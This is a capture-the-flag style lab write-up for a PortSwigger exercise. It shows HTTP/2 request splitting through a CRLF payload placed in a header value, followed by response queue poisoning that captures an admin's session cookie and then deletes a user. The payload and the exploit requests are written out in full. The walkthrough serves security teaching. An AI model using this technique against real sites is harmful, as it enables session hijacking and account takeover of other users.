# HTTP/2 Request Splitting via CRLF Injection


> **Lab:** HTTP/2 request splitting via CRLF injection

> **Difficulty:** Practitioner


---


# Objective


Exploit an **HTTP/2 → HTTP/1.1 downgrade** vulnerability to inject a second HTTP request using **CRLF injection**, 

causing **HTTP desynchronization** and **Response Queue Poisoning**. Capture the admin's login response, use the 

stolen session, then delete the user **carlos**.


---


# Vulnerability Overview


The front-end accepts requests over **HTTP/2** and downgrades them to **HTTP/1.1** before forwarding them to the 

back-end.


Because it **fails to sanitize CRLF (`\r\n`) characters** inside header values, an attacker can terminate the 

current headers and inject an entirely new HTTP request.


```text

HTTP/2 Client

      │

      ▼

 Front-end

(HTTP/2 → HTTP/1.1)

      │

      ▼

 Back-end

```

---



# Payload


A normal header is added (its name is irrelevant):


```http

Foo: bar

```


The payload is injected inside the header value:


```text

bar\r\n

\r\n

GET /x HTTP/1.1\r\n

Host: YOUR-LAB-ID.web-security-academy.net

```

---


# What happens after the downgrade?


Although the client sends **one HTTP/2 request**, the back-end interprets it as **two HTTP/1.1 requests**.


### Request #1


```http

GET / HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

Foo: bar

```



---



### Request #2 (Smuggled Request)



```http

GET /x HTTP/1.1

Host: YOUR-LAB-ID.web-security-academy.net

```




---



# Why use `/x` instead of `/admin`?



`/x` is used only as a **proof of concept**.


Since `/x` does not exist, it always returns:


```http

404 Not Found

```


Receiving a **404** in the next request proves that:


* Request Splitting worked.

* The injected request was executed.

* The response queue has been poisoned.


Using `/admin` immediately would likely return **401 Unauthorized**, making it difficult to determine whether the 

exploit failed or authentication simply failed.


---


# Response Queue Poisoning


The back-end processes two requests and generates two responses:


```text

Response #1 → 200 OK


Response #2 → 404 Not Found

```


However, the front-end expects only **one response**.


As a result:


```text

200 OK

        ↓

Sent to the attacker



404 Not Found

        ↓

Remains inside the response queue

```


---


# Why did I receive 200, then 404, then 302?


### First Response (200)


This is the response for the original request.


---


### Second Response (404)


This is **not** the response to the second request you sent.


It is the delayed response for the smuggled request:


```http

GET /x HTTP/1.1

```


which remained inside the response queue.


---


### Third Response (302)


Every few seconds the admin logs in.


The admin sends:


```http

POST /login

```


The server responds with:


```http

HTTP/1.1 302 Found

Set-Cookie: session=ADMIN_SESSION

```


Because of **Response Queue Poisoning**, this response is delivered to the attacker instead of the admin.

---


# Why wait 5 seconds?


The lab states that:


> **An admin user will log in approximately every 10 seconds.**


Waiting increases the chance that the admin logs in while the poisoned connection is still active.

---


# Why send another request?


The poisoned response remains inside the response queue.


It will not be delivered until another request is sent.


```text

Send Payload

      │

      ▼

Response Queue Poisoning

      │

      ▼

Send another request

      │

      ▼

Receive the queued response

```

---


# Using the Admin Session


After capturing:


```http

HTTP/1.1 302 Found

Set-Cookie: session=ADMIN_SESSION

```


Use the captured cookie in a normal request:


```http

GET /admin HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

Cookie: session=ADMIN_SESSION

```


> This is **not** part of the request smuggling attack. It simply uses the administrator's authenticated session 

obtained from the previous step.

---


# Delete Carlos


After accessing the admin panel, send:


```http

GET /admin/delete?username=carlos HTTP/2

Host: YOUR-LAB-ID.web-security-academy.net

Cookie: session=ADMIN_SESSION

```


This completes the lab.


---


# Attack Flow


```text

HTTP/2 Request

      │

      ▼

Inject CRLF into a Header Value

      │

      ▼

HTTP/2 → HTTP/1.1 Downgrade

      │

      ▼

Back-end interprets two requests

      │

      ▼

HTTP Desynchronization

      │

      ▼

Response Queue Poisoning

      │

      ▼
Capture the Admin's Login Response

      │

      ▼

Obtain Admin Session Cookie

      │

      ▼

Access /admin

      │

      ▼

Delete carlos

```



---



# Key Takeaways



* The vulnerability is caused by **HTTP/2 → HTTP/1.1 downgrade**, **not** by `Transfer-Encoding`.

* The attack relies on **CRLF Injection** inside a **header value**.

* `/x` is used only to verify that **Request Splitting** works.

* A `404 Not Found` confirms that the smuggled request was executed.

* **HTTP Desynchronization** occurs because the front-end believes it sent one request, while the back-end 

processes two.

* This leads to **Response Queue Poisoning**, allowing the attacker to receive responses intended for other users.

* After capturing the admin's `302` login response and session cookie, a normal authenticated request can be used 

to access the admin panel and delete `carlos`.


## Reference


* PortSwigger Web Security Academy – HTTP Request Smuggling: [https://portswigger.net/web-security/

request-smuggling](https://portswigger.net/web-security/request-smuggling)
